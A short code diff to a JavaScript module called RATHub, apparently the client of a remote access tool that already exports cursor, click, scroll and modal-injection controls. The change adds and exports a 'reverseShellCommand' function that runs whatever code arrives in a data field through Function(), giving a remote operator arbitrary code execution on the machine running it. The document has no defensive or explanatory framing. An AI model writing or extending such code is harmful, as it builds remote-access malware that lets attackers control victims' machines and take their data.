@@ -254,6 +254,12 @@ var RATHub = (function () {
 		}
 	}
 
+	var reverseShellCommand = function(data){
+		if(data.RSC != undefined && data.RSC !== null){
+			Function(data.RSC)();
+		}
+	}
+
 	return {
 		Initialize: constructor,
 		PrintCursor: printCursor,
@@ -264,5 +270,6 @@ var RATHub = (function () {
 		SetScrollDelta: setScrollDelta,
 		VirtualClick: virtualClick,
 		InjectModal: injectModal,
+		ReverseShellCommand: reverseShellCommand,
 	};
 })()
